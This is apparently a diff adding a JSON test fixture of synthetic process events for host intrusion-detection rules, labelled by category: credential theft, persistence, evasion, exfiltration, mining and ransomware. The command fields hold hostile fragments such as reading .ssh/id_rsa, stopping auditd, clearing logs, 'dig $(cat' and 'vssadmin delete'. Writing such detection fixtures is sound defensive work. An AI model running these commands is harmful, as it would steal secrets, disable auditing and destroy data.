+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "cat .ssh/id_rsa",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-CRED-102",
+    "event": {
+      "id": "audit-215",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "cat .mozilla",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-CRED-103",
+    "event": {
+      "id": "audit-216",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "env|grep",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PERSIST-001",
+    "event": {
+      "id": "audit-217",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "cp .service",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PERSIST-002",
+    "event": {
+      "id": "audit-218",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "cp .bashrc",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-PERSIST-003",
+    "event": {
+      "id": "audit-219",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "crontab -e ",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EVASION-001",
+    "event": {
+      "id": "audit-220",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": ">/var/log/",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EVASION-002",
+    "event": {
+      "id": "audit-221",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "systemctl stop auditd",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EVASION-003",
+    "event": {
+      "id": "audit-222",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "touch -d 1111",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXFIL-101",
+    "event": {
+      "id": "audit-223",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "rclone copy",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-EXFIL-102",
+    "event": {
+      "id": "audit-224",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "dig $(cat",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-MINE-001",
+    "event": {
+      "id": "audit-225",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "xmrig",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-RANSOM-001",
+    "event": {
+      "id": "audit-226",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "openssl enc -in -out .enc",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  },
+  {
+    "rule_id": "SATSUMA-RANSOM-002",
+    "event": {
+      "id": "audit-227",
+      "timestamp": 1793435797,
+      "source": "sys_proc",
+      "pid": 4242,
+      "starttime": 1234,
+      "exe": "/opt/isolated-fixture/tool",
+      "cmd": "vssadmin delete",
+      "uid": 1000,
+      "parent_cmd": "fixture-parent",
+      "action": "new_process",
+      "kind": "process",
+      "category": "host"
+    }
+  }
+]
